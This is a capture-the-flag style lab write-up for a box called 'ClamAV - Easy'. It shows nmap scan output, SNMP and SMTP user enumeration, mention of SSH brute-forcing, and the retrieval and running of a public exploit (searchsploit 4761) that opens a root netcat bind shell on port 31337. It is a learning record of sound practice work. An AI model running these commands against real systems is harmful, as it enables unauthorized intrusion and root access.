---
icon: ubuntu
---

# ClamAV - Easy

## Gaining Access

Nmap scan:

```
# Nmap TCP
nmap -A -T4 -p- -Pn 192.168.131.42 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-22 15:05 EDT
Nmap scan report for 192.168.131.42
Host is up (0.029s latency).
Not shown: 65528 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)
| ssh-hostkey: 
|   1024 30:3e:a4:13:5f:9a:32:c0:8e:46:eb:26:b3:5e:ee:6d (DSA)
|_  1024 af:a2:49:3e:d8:f2:26:12:4a:a0:b5:ee:62:76:b0:18 (RSA)
25/tcp    open  smtp        Sendmail 8.13.4/8.13.4/Debian-3sarge3
| smtp-commands: localhost.localdomain Hello [192.168.45.158], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, EXPN, VERB, 8BITMIME, SIZE, DSN, ETRN, DELIVERBY, HELP
|_ 2.0.0 This is sendmail version 8.13.4 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use "HELP <topic>". 2.0.0 To report bugs in the implementation send email to 2.0.0 sendmail-bugs@sendmail.org. 2.0.0 For local information send email to Postmaster at your site. 2.0.0 End of HELP info
80/tcp    open  http        Apache httpd 1.3.33 ((Debian GNU/Linux))
|_http-server-header: Apache/1.3.33 (Debian GNU/Linux)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Ph33r
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
199/tcp   open  smux        Linux SNMP multiplexer
445/tcp   open  netbios-ssn Samba smbd 3.0.14a-Debian (workgroup: WORKGROUP)
60000/tcp open  ssh         OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)
| ssh-hostkey: 
|   1024 30:3e:a4:13:5f:9a:32:c0:8e:46:eb:26:b3:5e:ee:6d (DSA)
|_  1024 af:a2:49:3e:d8:f2:26:12:4a:a0:b5:ee:62:76:b0:18 (RSA)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=9/22%OT=22%CT=1%CU=30800%PV=Y%DS=4%DC=T%G=Y%TM=68D19E6
OS:4%P=x86_64-pc-linux-gnu)SEQ(SP=B9%GCD=1%ISR=C5%TI=Z%CI=Z%II=I%TS=A)SEQ(S
OS:P=C0%GCD=1%ISR=C1%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=C6%GCD=1%ISR=CE%TI=Z%CI=Z%I
OS:I=I%TS=A)SEQ(SP=C9%GCD=1%ISR=CD%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=CD%GCD=1%ISR=
OS:D3%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M578ST11NW0%O2=M578ST11NW0%O3=M578NNT11NW0
OS:%O4=M578ST11NW0%O5=M578ST11NW0%O6=M578ST11)WIN(W1=16A0%W2=16A0%W3=16A0%W
OS:4=16A0%W5=16A0%W6=16A0)ECN(R=Y%DF=Y%T=40%W=16D0%O=M578NNSNW0%CC=N%Q=)T1(
OS:R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S
OS:=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R
OS:=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%
OS:UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 4 hops
Service Info: Host: localhost.localdomain; OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: share (dangerous)
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: 0XBABE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.14a-Debian)
|   NetBIOS computer name: 
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-09-22T19:06:56-04:00
|_clock-skew: mean: 6h00m10s, deviation: 2h49m43s, median: 4h00m09s
|_smb2-time: Protocol negotiation failed (SMB2)

TRACEROUTE (using port 995/tcp)
HOP RTT      ADDRESS
1   28.63 ms 192.168.45.1
2   28.60 ms 192.168.45.254
3   29.20 ms 192.168.251.1
4   30.19 ms 192.168.131.42
```

I alwyas like following a TCP scan with a UDP scan:

```
# Nmap UDP
sudo nmap -sU -p- -Pn --min-rate 10000 192.168.131.42 -oN scans/nmap-udpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-22 15:08 EDT
Warning: 192.168.131.42 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.131.42
Host is up (0.12s latency).
Not shown: 65455 open|filtered udp ports (no-response), 78 closed udp ports (port-unreach)
PORT    STATE SERVICE
137/udp open  netbios-ns
161/udp open  snmp
```

Since SNMP is open, I am going to look at that first. It looks like the low hanging fruit:

### SNMP Port 161 UDP

```
snmpbulkwalk -c public -v2c 192.168.131.42 . | tee snmpbulkwalk.out
```

I used snmpbulkwalk to dump everything, but it came out to be a rabbit hole, there was nothing useful.

### SMB Enumeration Port 445 TCP

<figure><img src="../../.gitbook/assets/image (2021).png" alt=""><figcaption></figcaption></figure>

SMB is a dead end as well we don't have any rights as guest.

### SMTP Enumeration Port 25 TCP

I am going to use a wordlist and try to bruteforce some possible usernames:

```
smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/namelist.txt -t 192.168.131.42
```

<figure><img src="../../.gitbook/assets/image (2022).png" alt=""><figcaption></figcaption></figure>

I tried brute forcing ssh using hydra using the usernames as password, but I got nothing. I am missing something, since the machine is called clam av. I am going to search for clam av see what comes up

### ClamAV 0.91.2 RCE

<figure><img src="../../.gitbook/assets/image (2023).png" alt=""><figcaption></figcaption></figure>

There is an RCE available for clamav I am going to download it and see what the script does.

```
searchsploit -m 4761
```

This Exploit opens a netcat shell as root on port 31337.

<figure><img src="../../.gitbook/assets/image (2024).png" alt=""><figcaption></figcaption></figure>

Let's see if it works!

```
perl 4761.pl 192.168.131.42
```

I am going to see if port 31337 is open on the machine now:

<figure><img src="../../.gitbook/assets/image (2025).png" alt=""><figcaption></figcaption></figure>

It is! we can connect to it using nc now and get a shell as root:

<figure><img src="../../.gitbook/assets/image (2026).png" alt=""><figcaption></figcaption></figure>

Even thought this box had a decent amount of rabbit holes, It was actually fun!
